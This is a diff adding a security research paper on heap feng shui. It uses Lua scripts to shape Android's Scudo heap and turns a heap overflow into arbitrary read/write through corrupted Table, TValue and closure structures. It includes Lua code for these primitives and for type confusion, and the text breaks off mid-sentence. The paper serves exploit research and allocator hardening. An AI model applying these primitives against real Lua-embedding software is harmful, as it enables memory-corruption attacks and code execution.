@@ -1,0 +1,1505 @@
+---
+title: The Moon vs The Shield: A Study of Heap Feng Shui Using Lua
+author: 3nso
+---
+|=-----------------------------------------------------------------------=|
+|=---=[ The Moon vs The Shield: A Study of Heap Feng Shui Using Lua ]=---=|
+|=-----------------------------------------------------------------------=|
+|=------------------------------=[ 3nso ]=-------------------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Introduction
+
+In this paper, I will demonstrate how the Lua programming language can be
+leveraged in exploit development to manipulate the layout of the heap prior
+to triggering a memory corruption bug, otherwise known as heap feng shui.
+While the idea of leveraging scripting languages in this way is not new
+[1], there is a lack of resources describing how Lua can be used in this
+context.
+
+We will explore some techniques that can be leveraged against Scudo, the
+default userland allocator on Android since version 11. Although Scudo may
+not be the most common allocator you'll encounter, given that it is the
+default in modern versions of Android it's not exactly niche either. In
+addition, Scudo is designed to be a hardened allocator, especially designed
+to make things like heap feng shui difficult, and as such it should make
+for an interesting case study.
+
+Crucially, this paper will not talk about bugs in the Lua interpreter or
+virtual machine itself, although there are plenty, as a good amount of
+prior research has already been done in this area.[2] [3] [4] [5] [6] [7]
+[8]
+
+The final question to answer before we get into things is: why Lua? Well,
+because three billion devices run Lua! Joking aside, Lua is in more places
+than one might imagine. It is easily embeddable in C/C++ (in fact this is
+one of the key features of the language), it's small, and it's relatively
+efficient. It's in countless game engines for these reasons, allowing
+developers to script various aspects of their games more easily than having
+to write C/C++ code for everything. Many games that support mods allow
+modders to write custom Lua scripts to change the game's behavior.
+
+But it's not just games - Lua is quite frequently used as a configuration
+language. Neovim and the Awesome window manager spring to mind. It's also
+present in enterprise software, such as Redis (where it was actually the
+cause of a recent critical security flaw [9]) and Qualys products [10].
+
+--[ Lua Internals Primer
+
+Before we can begin talking about the techniques, a couple of primers are
+needed to lay the groundwork for future explanations. Let's start with Lua
+internals - specifically, some useful structure definitions - so we know
+what's available to us when manipulating the heap. We'll be looking at Lua
+5.2, since there seems to be some consensus amongst fans of the language
+that this is one of the best/most popular versions. It is important to note
+that the bytecode, and indeed many internal implementation details, are not
+compatible between major versions of Lua. As such, the explanations here
+are only applicable to Lua versions 5.2.*. They *may* work on Lua 5.1, 5.3
+and 5.4, but chances are some adaptations will need to be made.
+
+A note on terminology: Lua is implemented in pure C, so there are no
+classes or objects; it's all just structs, unions, and native data types.
+Throughout the explanations below, the words "struct" and "object" will be
+used interchangeably to help with the flow of the explanations, but just
+bear in mind that whenever I say "object", that's technically incorrect,
+and I probably mean "struct".
+
+----[ Tables, Tables Everywhere
+
+Tables are one of the fundamental features of Lua. Pretty much everything
+is a table. You want an array? It's implemented with a table. Hashmaps?
+Implemented with tables. Object-oriented features? Tables.
+
+The structure definition for a table is as follows:
+
+```c
+#define CommonHeader        GCObject *next; lu_byte tt; lu_byte marked
+
+typedef struct Table {
+  CommonHeader;
+  lu_byte flags;  /* 1<<p means tagmethod(p) is not present */
+  lu_byte lsizenode;  /* log2 of size of `node' array */
+  int sizearray;  /* size of `array' array */
+  TValue *array;  /* array part */
+  Node *node;
+  Node *lastfree;  /* any free position is before this position */
+  struct Table *metatable;
+  GCObject *gclist;
+} Table;
+```
+
+Given the multi-faceted use for tables in the language, there are a fair
+few fields, perhaps more than one would expect for such a conceptually
+simple object. For our purposes we really only care about tables as arrays,
+so we only need to worry about the `sizearray` and `array` fields.
+
+Often when developing an exploit, we're aiming to be able to read and write
+arbitrary memory. In other words, we want to construct an arbitrary
+read/write primitive. Assuming we already have some sort of memory
+corruption bug allowing us to corrupt heap memory with data we control,
+it's easy to see how we might be able to leverage a `Table` object to
+create our primitive. We'd essentially want to corrupt the `sizearray` and
+`array` fields.
+
+In fact, corrupting just the `array` field would be enough, but if we have
+a continuous corruption (that is, if we cannot skip some bytes to start
+corrupting at some specific offset from the start of our buffer), we will
+have to corrupt the `sizearray` field anyway. So, in our theoretical
+exploit scenario we would be using tables as our victim objects, and our
+goal would be to manipulate the heap such that we can get a `Table` object
+allocated next to our vulnerable buffer on the heap.
+
+The eagle-eyed reader may have spotted a small issue with the `Table`. The
+size of this object is constant. There is nothing an attacker can control
+that would in any way influence the size of a `Table` object. The actual
+array containing the data in the table is created using a separate call to
+`malloc`, so adding/removing elements from the array wouldn't have any
+effect on the actual allocation of the `Table` object itself. Depending on
+the allocator we're working with, this could be a huge problem. In the case
+of Scudo, however, there is a primitive but easy workaround which we will
+discuss later.
+
+----[ Tea Values? Thanks, But I Prefer Coffee
+
+All values in Lua are represented internally using the `TValue` struct
+which is defined as follows:
+
+```c
+/*
+** Union of all Lua values
+*/
+typedef union Value Value;
+#define numfield	lua_Number n;    /* numbers */
+
+#define TValuefields	Value value_; int tt_
+typedef struct lua_TValue TValue;
+
+union Value {
+  GCObject *gc;    /* collectable objects */
+  void *p;         /* light userdata */
+  int b;           /* booleans */
+  lua_CFunction f; /* light C functions */
+  numfield         /* numbers */
+};
+
+struct lua_TValue {
+  TValuefields;
+};
+
+```
+
+simplifying this a bit, we essentially have:
+
+```c
+struct TValue {
+  Value value_;
+  int tt_;
+};
+```
+
+A TValue then is basically a typed value, which in addition to including
+the value itself also includes some type information. This makes sense, but
+why is this important? Well, the `array` part of a table is represented as
+an array of TValues. We have to be mindful of this fact when using a table
+to read and write memory. When reading, the type information doesn't matter
+too much until we actually try to *use* the value we've just read.
+Realistically, if we want to read arbitrary memory we need to find a way of
+converting the value to a number. Similarly, when *writing*, we will not
+only write the value itself but also the *type*. In essence we will be
+corrupting an additional eight bytes (four bytes for the type and four
+bytes of padding) past the data we actually wanted to write. In most
+scenarios this likely won't cause any issues, but it's important to keep in
+mind, as this additional corruption may break things.
+
+How we can deal with this pesky problem when reading data is something we
+will come back to later, once we've talked a little bit about some actual
+memory corruption.
+
+----[ Hey! That's Not Garbage!
+
+It's worth mentioning that Lua has a garbage collector. It is also worth
+mentioning that this garbage collector is a real pain when it starts trying
+to collect corrupted objects. Luckily, we can just stop the garbage
+collector by doing the following in our Lua code:
+
+```lua
+collectgarbage("stop")
+```
+
+This is something we will most definitely want to do, because not only will
+the garbage collector cause a segmentation fault by accessing corrupted
+objects, it could also trigger Scudo's defenses if it frees a corrupted
+chunk.
+
+--[ Scudo: The Heap's Shield
+
+Now it's time for a quick primer on the Scudo allocator and its internals.
+A proper deep dive into all of Scudo's internals is out of the scope of
+this paper, not to mention that there are already some resources available
+in this area which do a far better job than I could ever hope to achieve
+here, such as a paper by Phrack's very own BSDaemon [11] and a writeup by a
+duo who go by un1fuzz [12]. With that in mind, let's get into the Scudo
+crash course.
+
+Scudo is actually two allocators in one. The Primary allocator is used to
+handle smaller allocations (<=64KB), and the Secondary allocator is used to
+handle any larger allocations. We will only concern ourselves with the
+Primary allocator here, and, in all honesty, the Primary allocator is where
+most of Scudo's interesting features are.
+
+The Primary allocator works around the concept of allocation *classes*.
+Each class handles allocations for a range of possible sizes. For example,
+on 64-bit Android the classes are defined as:
+
+```c
+static constexpr uptr Classes[] = {
+  0x00020, 0x00030, 0x00040, 0x00050, 0x00060, 0x00070, 0x00090, 0x000b0,
+  0x000c0, 0x000e0, 0x00120, 0x00160, 0x001c0, 0x00250, 0x00320, 0x00450,
+  0x00670, 0x00830, 0x00a10, 0x00c30, 0x01010, 0x01210, 0x01bd0, 0x02210,
+  0x02d90, 0x03790, 0x04010, 0x04810, 0x05a10, 0x07310, 0x08210, 0x10010,
+};
+```
+
+Other systems may have their own versions of this table, or use some sort
+of calculation to determine which class a given allocation will be handled
+by. We'll take the Android example for our explanations below.
+
+Classes are 1-indexed, so the first class is Class 1, which for Android
+handles any allocations from 0-32 bytes, Class 2 handles 33-48 bytes, and
+so on. One small detail to consider is that the sizes listed here are the
+*total* sizes required to handle the allocation, *including* any data
+structures required by Scudo.
+
+When Scudo allocates some memory it allocates it as a *chunk*. Each chunk
+starts with a 16-byte chunk header followed by the user data. In practice,
+what this means is that Class 1 will handle calls to `malloc` where the
+size passed to `malloc` is 0-16, *not* 0-32. This is also why the last
+class size is 0x10010, 64KB + 16 bytes for the chunk header. It is also
+important to note that chunks are *fixed size*. Chunks allocated in Class 1
+will *always* be 32 bytes in size, even if the size passed to `malloc` was
+smaller. The exact structure of the chunk header is not important, but
+suffice to say it contains important metadata, as well as a checksum value
+which is checked when the chunk is freed. If the checksum has been
+corrupted (e.g., by some kind of memory corruption bug), Scudo will abort
+the program.
+
+So, putting all this together, if we have a program which calls
+`malloc(12)` Scudo will go ahead and return us a chunk in Class 1. The size
+of this chunk will be 32 bytes, with the first 16 bytes containing the
+chunk header, followed by another 16 bytes of space for user data. This
+means that four bytes of heap memory will be wasted by this allocation,
+since *technically* the program should only ever access the first 12 bytes
+of the user data. That being said, if the four "unused" bytes were to be
+accessed, it would not result in a segmentation fault, since technically it
+is valid memory. Of course, the pointer returned by Scudo to the program
+will point to the start of the user data, just after the chunk header.
+
+Now that we've dealt with classes and chunks, we also need to talk about
+regions. In addition to splitting up allocations into classes by size,
+Scudo also splits heap memory up into *regions*. Essentially, each region
+services allocations for one particular class. Region 1 services Class 1
+allocations, Region 2 services Class 2, and so on. There is also a special
+Region 0 which is used by Scudo for its internal structures. The fact that
+each region services one particular class of allocations has the somewhat
+obvious but noteworthy effect that each region is split up into a set of
+equally sized chunks. Each region is separated from the next region (or
+whatever else comes after) by a guard page, which is mapped as `PROT_NONE`.
+This is one of the security features of Scudo.
+
+The size of each region is configurable. For example, on Android each
+region is 256MB. The memory for all regions is mapped at program start;
+however, not all of the memory is actually committed (in use). Scudo
+commits the memory for each region 256KB at a time, though this too is
+configurable. So, at program start, each region is 256KB in size. If the
+first 256KB in a region is in use at the same time (the program `malloc'd`
+enough chunks to use up 256KB), Scudo will go ahead and carve an additional
+256KB out of the region's guard page, and serve allocations from this
+"fresh" memory. If the entire 256MB of available space is used up, the
+region is "exhausted", and any allocations will be serviced from the next
+class up. So, if all of Region 1 is used up, any Class 1 allocations will
+be "promoted" to Class 2, and will be allocated in Region 2.
+
+--[ Putting it All Together
+
+Now that we've covered all bases for required prior knowledge, we can get
+into the meat and potatoes of this paper: how to put all of this together.
+What we want to achieve is a heap layout where we have a Lua `Table` right
+after some vulnerable buffer that we can overflow, as shown below:
+
+```
++-----------+----------+-----------+-----------+
+|   stuff   |  buffer  |   Table   |   stuff   |
++-----------+----------+-----------+-----------+
+```
+
+One thing I haven't mentioned in the Scudo primer is that Scudo introduces
+a decent amount of randomness into its operation, which means that as an
+attacker we cannot reliably predict where in memory the next chunk will
+come from. However, remember that regions are committed 256KB at a time. We
+can just start allocating Lua `Table` objects until we fill the current
+256KB. At this point Scudo will carve out a fresh 256KB bit of memory for
+the region. We can just keep allocating `Table` objects until we fill this
+256KB bit of memory as well. Note that over-allocating does not cause a
+problem here; all we want to achieve at this stage is to have a region
+filled with Lua tables.
+
+Now all we have to do is free one of these tables and allocate the buffer
+that we will overflow. Given that we've just made a single hole in an area
+of memory that should be filled entirely with tables, we have a pretty high
+probability of achieving the desired memory layout. At this point our
+memory should look something like this:
+
+```
++-----------+----------+-----------+-----------+
+|   Table   |  buffer  |   Table   |   Table   |
++-----------+----------+-----------+-----------+
+```
+
+However, it should be noted that Scudo also has a Quarantine. Without going
+into too much detail, the Quarantine is used to delay/randomize the return
+of free chunks into the pool of chunks that can be allocated. The
+Quarantine isn't always enabled (it's turned off in Scudo's default
+configuration), but if it is enabled, we cannot know when a chunk we just
+freed will be allocated again. In this case, instead of making a hole for
+our buffer by freeing a chunk, we simply have to leave a hole by allocating
+1 fewer `Table` structs than we normally would and allocate our buffer to
+fill the hole we left. This is not as ideal, but needs must...
+
+Regardless of how the desired heap layout was achieved, there are now two
+potential ways of getting an actual exploit, depending on the exact nature
+of the bug, and by extension, the overflow.
+
+----[ Triggering Bugs from the Moon
+
+The ideal situation is one where we are able to corrupt *both* the
+`sizearray` and `array` fields of the victim table *AND* we are able to
+leak the address of another `Table` struct before the overflow is
+triggered. To corrupt both the `sizearray` and `array` fields we need to be
+able to write at least 40 bytes past the end of the chunk. We need to write
+16 bytes for the header of the next chunk, and to completely overwrite the
+`sizearray` field we need to be able to write another 16 bytes. To corrupt
+the `array` field we need to be able to write a further eight bytes to
+totally control the pointer, for a total of 40 bytes.
+
+Assuming we can corrupt the fields we need, the process is simple: we can
+include the address of the leaked table in our payload and use our overflow
+vulnerability to corrupt the `sizearray` and `array` fields of our victim
+table such that the `array` field will point to the leaked table. This will
+allow us to use our victim table to corrupt the leaked table struct, but
+with more precision and in a way that is repeatable. For example, we could
+repeatedly corrupt just the `array` field of the leaked table with
+different addresses, essentially giving us an arbitrary read/write
+primitive.
+
+Now, all of the preconditions for this case might seem infeasible,
+especially the ability to leak the address of a Lua table. Leaking the
+address of a Lua table is actually pretty easy given that we can just call
+`tostring()` on the table and Lua will return something like:
+
+```
+table: 0x5bc6b2a25c20
+```
+
+However, for all this to work, we either need to be able to get the leaked
+table address back out of the target (e.g., by sending it over the
+network), OR we need to be able to execute the entire exploit from within
+Lua. In the second case we'd end up with something like:
+
+```lua
+t = {1,2}
+addr = tostring(t)
+
+addr = split(split(addr, " ")[2], "x")[2]
+payload = generate_payload(addr)
+do_feng_shui()
+trigger_overflow(payload)
+```
+
+NOTE: For brevity in the snippet above, I have assumed that the functions
+`split()`, `generate_payload()`, `do_feng_shui()` and `trigger_overflow()`
+are defined. An implementation for the `split()` function can be found in
+the Scribunto Mediawiki extension. [13]
+
+----[ Why Use Many Region When One Region Do Trick
+
+If we are only able to corrupt, say, the `sizearray` field, we will need to
+leverage our memory corruption to create a weaker primitive. The
+`sizearray` field tells Lua how big the array portion of the table is. By
+corrupting this field such that we increase its value, we can create a
+pretty powerful read/write primitive. Ideally we want to set it to the
+maximum value possible to get the most out of our primitive. For Lua 5.2
+this field is of type `int`. Annoyingly, the Lua devs opted to use a signed
+integer for this field - because negatively sized arrays are a thing?
+Anyway, on a 64-bit Linux or Android system, what this means is the max
+value we can set here is `0x7fffffff` since the `int` type is four bytes.
+We can then use this corrupted table to more precisely corrupt just the
+`array` field of another table, giving us a proper read/write primitive.
+
+It may be tempting to use our corrupted table to *read* memory and scan for
+a `Table` struct; however, due to the use of `TValue`s this could actually
+land us in some trouble and crash the target (for example, if the `tt_`
+field of the `TValue` we read is invalid). I will go into how to deal with
+this later, but for now what this means is that our initial corrupted table
+can only be used to *write* data. As such, we need to somewhat blindly
+attempt to corrupt the `array` field of another table. In reality, given
+that the sizes of all chunks in a region are the same, it's not such a
+blind write, and we can calculate the correct array index to use for our
+write.
+
+We also need to ensure that the array *data* of our corrupted table is near
+some other `Table` structs in memory. Remember, we're talking about the
+scenario where we've only corrupted the `sizearray` field, allowing us to
+read outside the bounds of the array. To ensure our array is near some
+other `Table` structs in memory, we need to make sure that the size of the
+data in the array is similar to the size of a `Table` struct. This way,
+both the array data and `Table` structs will go into the same Scudo region.
+Of course, this creates a slight problem in that the effectiveness of our
+heap feng shui will be reduced since we will no longer have a portion of
+memory filled with just `Table` structs, but with arrays as well. The
+benefit of this method is that there are no special requirements for
+employing it. We do not need to be able to leak any address or other data,
+and we do not necessarily need to be able to trigger the overflow from
+within Lua, though it sill helps if we can.
+
+--[ Dealing with Different Sizes
+
+Earlier I briefly mentioned a small problem with Lua's tables, which is
+that they are fixed size. On a 64-bit Linux or Android system, the size of
+a `Table` is 56 bytes (assuming that `sizeof(int) == 4`). Adding an
+additional 16 bytes for the chunk header expands this to 72 bytes (0x48).
+This means that by default, `Table` objects will be served by Class 4
+allocations on Android or Class 3 allocations on desktop Linux, and will
+therefore go into their respective regions.
+
+What if our target buffer/object that we overflow is smaller or larger?
+Surely in that case the target buffer will go into a different region, and
+therefore we cannot use Lua tables to do our heap manipulation?
+
+Discussing this exact problem with droogie one evening, they helpfully
+pointed out that we can actually force allocations to go into higher
+regions by exhausting lower regions. I'm going to say that they had the
+advantage of a fresh pair of eyes, or maybe I'm just making excuses for
+being a n00b.
+
+Either way, this is exactly what you'd do. If your target object is smaller
+than a `Table`, you need to keep allocating more and more of your target
+object to fill up all regions until they get promoted to the same region
+that tables are in. Now, given the exact context of the exploit, what
+interactions can be performed with the target program, etc., this may or
+may not be possible. Conversely, if the Lua `Table` object is too small,
+you can just keep creating more and more `Table` objects until they get
+promoted to the target region. Assuming you can execute arbitrary Lua code
+(which is kind of a base assumption for this entire paper), this should be
+pretty easy to do.
+
+One thing to bear in mind, however: the more regions you exhaust the more
+you increase contention in the higher regions. Let's assume you wanted to
+promote your Lua `Table` objects into Region 7. On Android, this means you
+have to exhaust Regions 4, 5 and 6 by filling them with `Table` objects.
+This means that *ANY* allocation that would've otherwise gone into one of
+these regions will now also go into Region 7. This will make manipulating
+the heap more difficult, as you are essentially competing with all of these
+extra allocations for space in Region 7.
+
+Furthermore, depending on Scudo's configuration, it can be quite difficult
+to exhaust a region. For example, the default configuration for Linux sets
+the size of each region to 4GB. That's quite a lot to fill up.
+
+--[ Learning to Read
+
+Earlier I mentioned that Lua tables store their data as an array of
+`TValue`s, and I also pointed out that this poses a slight problem for
+reading/writing memory. There's not much we can do to work around this when
+writing data, but as promised, it's now time to revisit this and explain
+how we can work around this problem when *reading* memory.
+
+The trick is to use another table. Or rather, another two tables. First,
+let's examine how a table's array data is laid out in memory:
+
+```
+     0x00           0x08         0x0f
+      +--------------+------------+
+0x00  |    Value_    |     tt_    |
+      +--------------+------------+
+0x10  |    Value_    |     tt_    |
+      +--------------+------------+
+0x20  |    Value_    |     tt_    |
+      +--------------+------------+
+0x30  |    Value_    |     tt_    |
+      +--------------+------------+
+0x40  |    Value_    |     tt_    |
+      +--------------+------------+
+0x50  |    Value_    |     tt_    |
+      +--------------+------------+
+```
+
+Since each `TValue` takes up 16 bytes of memory, we get a neat array, as
+shown above. Now, let's assume we have a `Table` called `t1` which has its
+`array` field pointing to our theoretical data depicted above. If we were
+to read some arbitrary memory and write it to the first element (`t[1] =
+read_memory(addr)`) we would indeed store the contents of the memory we
+wanted in the `Value_` field; however, we have no guarantees about the
+value of the `tt_` field, which could cause problems if we actually want to
+use the data we just read for anything.
+
+Well, what if we had another table, `t2`, and we set its `array` field to
+point to the `tt_` value at offset 0x08? We could just overwrite the `tt_`
+value with whatever we wanted and trick Lua into treating `Value_` as
+whatever data type we want! For example, we could use `t2[1] =
+1.4821969375237e-323` and get Lua to treat the `Value_` as a number. Or we
+could use `t2[1] = 2.9643938750475e-323` to get Lua to treat it as a
+function. This would of course also end up trashing the `Value_` at offset
+0x10, but we don't really care about that.
+
+Using this trick, we can read arbitrary memory, then treat the value we
+read as any data type within Lua so we can do something useful with it,
+such as perform arithmetic on the value.
+
+This all works great, except for a small edge case I was fortunate enough
+to encounter (or unfortunate, depending on your viewpoint). See, when
+assigning a value to a table entry in Lua the assignment logic is handled
+by the `luaV_settable` function. Unfortunately for us, the logic in this
+function is not just as simple as "copy value into table". I won't include
+the whole function here, just the part that performs the assignment:
+
+```c
+setobj2t(L, oldval, val);  /* assign new value to that entry */
+invalidateTMcache(h);
+luaC_barrierback(L, obj2gco(h), val);
+return;
+```
+
+Taking this from the top, the call to `setobj2t` assigns the new value to
+the table entry. So far so good. We don't really care about the call to
+`invalidateTMcache`, however, the call to `luaC_barrierback` is a bit of a
+problem. This function is responsible for doing some bookkeeping for the
+garbage collector. There's no logic involved which checks the state of the
+garbage collector, so this bookkeeping is performed even if we specifically
+asked for the garbage collector to be turned off. Remember that each time
+we perform a read we're reading a `TValue`. That is, 8 bytes for the
+`Value_` which is what we're interested in, and another 8 bytes for `tt_`.
+If the `tt_` field happens to have bit 6 set, Lua thinks that the value we
+just read is a collectable object, and will attempt to perform its
+bookkeeping for the garbage collector. This means that the address we just
+read from will be treated as a `GCObject`, and Lua will start attempting to
+access various fields as it performs the bookeeping operations. Given that
+we're reading arbitrary memory, the address we just read from will almost
+certainly not hold a valid `GCObject`, so this access will result in a
+crash.
+
+This means that we can't quite use the table trick I just described for
+reading arbitrary memory, but I wasn't just wasting your time by explaining
+it since we'll use it to set up a proper arbitrary read primitive.
+
+--[ The Answer is Clos(ur)e
+
+If we take the core lessons from the table trick described above, what we
+need for reading arbitrary memory is essentially a pointer to a `TValue`
+that we can read into, and that we can "corrupt" by overwriting its `tt_`
+field. Looking through the Lua source code for objects which contain
+`TValue` pointers it turns out we aren't spoiled for choice. In fact, the
+`Closure` object pretty quickly becomes the next obvious candidate.
+
+```c
+typedef struct CClosure {
+  ClosureHeader;
+  lua_CFunction f;
+  TValue upvalue[1];  /* list of upvalues */
+} CClosure;
+
+
+typedef struct LClosure {
+  ClosureHeader;
+  struct Proto *p;
+  UpVal *upvals[1];  /* list of upvalues */
+} LClosure;
+
+
+typedef union Closure {
+  CClosure c;
+  LClosure l;
+} Closure;
+```
+
+Lua has two types of closure objects, `CClosure` which represents closure
+objects implemented in C, and `LClosure` which represents closure objects
+that have a Lua implementation. Since we can't create a `CClosure` from
+inside Lua code, we can safely ignore it, leaving us with the `LClosure`
+object. Now, this object doesn't actually contain a `TValue` pointer,
+however, it does contain an `UpVal` pointer, which is basically just as
+good. In fact, if we look at the definition of `UpVal` we see that this
+object is essentially a wrapper around a `TValue`:
+
+```c
+typedef struct UpVal {
+  CommonHeader;
+  TValue *v;  /* points to stack or to its own value */
+  union {
+    TValue value;  /* the value (when closed) */
+    struct {  /* double linked list (when open) */
+      struct UpVal *prev;
+      struct UpVal *next;
+    } l;
+  } u;
+} UpVal;
+```
+
+So, our high level strategy is as follows:
+
+- Create an `LClosure` object with at least one upvalue
+- Read data from our target memory address into the upvalue
+- Leak the address of the `LClosure` object
+- Use this address to leak the address of the `UpVal` object
+- Corrupt the `tt_` field of the `TValue` inside the `UpVal`
+
+But how does one create an `LClosure` object? Well, it turns out that all
+Lua functions are represented using `LClosure` since Lua treats functions
+as first class types. So all we need to do is define a function and make
+sure that it has at least one upvalue. The easiest way to do this is to
+define a closure like so:
+
+```lua
+function outer(param)
+  local upval = param
+  function inner()
+    return upval
+  end
+
+  return inner
+end
+```
+
+In this case, the function `inner()` is a closure and the value of the
+local parameter `upval` is bound to whatever we call the function `outer()`
+with. The `outer()` function returns the closure, which we can then call
+and have `upval` returned. For example:
+
+```
+> fun = outer(10)
+> print(fun())
+10
+```
+
+Now, if we want to turn this concept into an arbitrary read, we might do
+something like:
+
+```lua
+function read_closure(addr)
+  -- Use our corrupted table to set the address we want to read from
+  -- and read the value into upval1
+  corrupted[1] = addr
+  local upval1 = rwtable[1]
+
+  -- Closure which simply returns the value of upval1
+  function inner()
+    return upval1
+  end
+
+  return inner
+end
+
+function arbitrary_read(addr)
+  -- Get our closure object
+  inner = read_closure(addr)
+
+  -- Get the address of the closure object in memory
+  -- And get the address of the `upvals` array
+  inner_addr = get_table_addr_str(inner)
+  upvals_addr_addr = hex2double(inner_addr) + hex2double("20")
+
+  -- Get the address of the `TValue` and corrupt its `tt_` field
+  upvals_addr = read_addr(upvals_addr_addr)
+  upval1_tt_addr = upvals_addr + hex2double("20")
+  write_addr(upval1_tt_addr, 1.4821969375237e-323)
+
+  -- Return the value in upval1
+  return inner()
+end
+```
+
+This is essentially an implementation of the high level strategy outlined
+above. The `read_closure` function creates a local variable called `upval1`
+and uses the corrupted table to read from an arbitrary memory address into
+this variable. Since we're just reading into a local variable, the Lua
+logic this time really is just a simple copy from one memory address to
+another, so we don't have to worry about any garbage collector magic. The
+function then creates a closure, for which the local variable `upval1` will
+be an upvalue, and returns it. The `arbitrary_read` function is really just
+a wrapper for convenience. It gets the closure object, then does some
+address arithmetic to find its upvalue on the heap and modify its `tt_`
+field so that Lua can interpret the data in some meaningful way. The
+`read_addr` function might look like I'm cheating here, since I'm creating
+an arbitrary read using an arbitrary read, but actually, the `read_addr`
+function is our "arbitrary" read implementation using the table trick from
+before. Technically, there is still a chance that using this weaker
+primitive will lead to a crash, since we can't guarantee that we avoid the
+garbage collection issue from before, but since we're only using this
+primitive to read from an `LClosure` object on the heap the memory layout
+should be more predictable and therefore our chances of hitting that pesky
+edge case should be significantly lower.
+
+--[ 1.4821969375237e-323 ??????????
+
+As you read those previous sections, there was probably one particular part
+where you went "HUH?? WHAT?!?!". If yes, good. If no, well, I'm honestly
+not sure what to say. Either way, I hope you kept reading, because it's
+time to explain what that was all about. See, our best way to *write*
+arbitrary data using tables is to write *numbers*. In Lua there aren't
+specific integer and float types (at least prior to Lua 5.3, where the
+integer type was introduced), so numbers are just... numbers. Basically, we
+can just have numbers with "whatever" value we want, which is pretty
+natural for us humans. But Lua has to represent these numbers internally
+*somehow*, and for that, it uses the native `double` type:
+
+```c
+#define LUA_NUMBER	double
+
+/* type of numbers in Lua */
+typedef LUA_NUMBER lua_Number;
+```
+
+This poses a bit of an interesting challenge: how do we turn a sequence of
+bytes we want to write into a number that can be represented in Lua, AKA a
+double? And better yet, how do we do this using pure Lua code? Well, the
+answer is we pull up the IEEE 754 standard, otherwise known as the IEEE
+Standard for Floating-Point Arithmetic, and start reading. I'll spare you
+the details of the standard, but what we really want to know is the
+bit-level representation of double-precision floating-point numbers. That
+looks a little something like this:
+
+```
+  63                52                                    0
++---+----------------+------------------------------------+
+| S |       E        |                  F                 |
++---+----------------+------------------------------------+
+```
+
+In this representation, S is the sign bit, E is the exponent and F is the
+fraction. Given an eight-byte value that we want to represent as a double,
+all we need to do is mask off the correct bits from each byte to get the
+values of S, E, and F. Then we can use this handy formula:
+
+(-1)^S * 2^(E-1023) * (1+1/F)
+
+Two small problems though. First, Lua doesn't implement any bitwise
+operators - we're just going to have to use math instead. For example, if
+we want to mask off the N least significant bits of a number, we can just
+use % 2^N. For example, to get the seven least significant bits, we would
+use `% 0x80`. To get the four least significant bits, we would use `%
+0x10`, and so on. Using this trick in combination with subtraction,
+addition, multiplication, and division, we can more or less re-implement
+the bitwise operations we need.
+
+The other issue we need to deal with is the presence of subnormals. These
+are double-precision floats where E=0. If this is the case, our handy
+formula for calculating the value of a double changes to this:
+
+(-1)^S * 2^(-1022) * (0+1/F)
+
+Thankfully, this is easy enough to deal with. For fear of putting you to
+sleep, I won't dwell too much more on the math, suffice to say that once we
+put all this together we end up with something like this:
+
+```lua
+function lsl(v, s)
+  return v * math.pow(2,s)
+end
+
+function hex2double(v)
+  local bytes
+  local S
+  local F
+  local E
+  local ii
+  local jj
+
+  -- Make sure the input is 16 characters
+  while #v < 16 do
+    v = "0" .. v
+  end
+
+  v = string.sub(v, -16)
+
+  ii = 1
+  jj = 1
+  bytes = {0,0,0,0,0,0,0,0}
+  while ii < 16 do
+    bytes[jj] = tonumber(string.sub(v, ii, ii+1), 16)
+    ii = ii + 2
+    jj = jj + 1
+  end
+
+  S = 1
+  if bytes[1] > 0x7f then
+    S = -1
+  end
+
+  bytes[1] = bytes[1] % 0x80
+  E = lsl(bytes[1], 4) + math.floor((bytes[2] - (bytes[2] % 0x10))/16)
+
+  bytes[2] = bytes[2] % 0x10
+  F = lsl(bytes[2],48) + lsl(bytes[3],40) + lsl(bytes[4],32) + lsl(bytes[5],24) + lsl(bytes[6],16) + lsl(bytes[7],8) + bytes[8]
+  F = F/0x10000000000000
+
+  -- Subnormals
+  if E == 0 then
+    return S * math.ldexp(0+F, -1022)
+  else
+    return S * math.ldexp(1+F, E-1023)
+  end
+end
+```
+
+Note that we're using the `math` library from Lua. According to the Lua
+documentation, while this library is standard, it is not part of Lua core.
+Therefore, it is not guaranteed to be present in every environment you may
+encounter. If the `math` library is missing, it should be possible to
+re-implement all of the functions needed using pure Lua, though this would
+add a significant amount of effort.
+
+This all works great so far, except for a third, sneaky issue which I
+deliberately glossed over earlier. Those familiar with floating-point
+numbers might already know what the problem is. The floating point standard
+assigns special meaning to certain bit representations. We've already seen
+and dealt with one of these, which is where E=0 for subnormals. Well,
+E=0x7ff (all 1's) also has a special meaning. It is used to represent
+either NaN or infinity, depending on the value of F. This means that we
+cannot represent every possible sequence of eight bytes using this trick.
+
+We can, however, work around this. For example, if we wanted to write a
+value we cannot represent, such as 0xffffffffffffffff, we could do it by
+writing it as two values that we *can* represent. In this case, we would
+need to do two writes of 0xffffffff, four bytes apart. To ensure the writes
+lined up properly, we would need to perform some table trickery by first
+corrupting the `array` field of our read/write table to point to the
+address we want to write, then corrupting it again to have the same value +
+4 (or -4 on little-endian systems) after the first write. Thankfully, this
+isn't too much of an issue, and just means for some values we need to do
+two writes instead of one.
+
+We actually need to deal with all the same problems when *reading* values
+as doubles too. Luckily, thanks to the extensive research others have done
+on Lua internals, there are already some solutions out there which can turn
+a double into an integer, so long as the double isn't one of the special
+values that I mentioned earlier. A great example can be found in "Bytecode
+Breakdown: Unraveling Factorio's Lua Security Flaws"[2] along with some
+tips on dealing with those special values if needed.
+
+Another fun, though potentially not very useful, trick is to use the type
+confusion trick mentioned earlier to get Lua to treat a value as a function
+rather than a number. We can do this by setting the `tt_` field of the
+value to 6 (this is where 2.9643938750475e-323 came from). Then, using
+`tostring()` on the value will give us something like:
+
+```
+function: 0xffffffffffffffff
+```
+
+where 0xffffffffffffffff is the value we were trying to read. This provides
+us with another potential way of working around those special values.
+
+By the way, this trick can also be used in reverse, by *writing* some
+arbitrary value as a number then changing its type to a function. Invoking
+said function will cause the value we wrote to be interpreted as the
+address of a Lua `Closure` object. This is outside the scope of this paper,
+but if we set up a fake `Closure` object, we can then leverage this to get
+code execution.
+
+--[ Checking for Corrupted Tables
+
+One final thing I have not yet mentioned is how to find our corrupted table
+once we have at random corrupted one of the many tables we have on the
+heap. Given that we are going to have to corrupt the `sizearray` field, it
+might be tempting to simply ask Lua for the size of all of the tables and
+see which one has a corrupted size. This would be a great idea, except Lua
+has to actually *access the table data* to determine a table's size,
+because if the table has a bunch of `nil` values at the end, Lua does not
+want to include them in the size returned to the user. This is a huge
+problem for us, given that if we corrupt `sizearray` to be `0x7fffffff`,
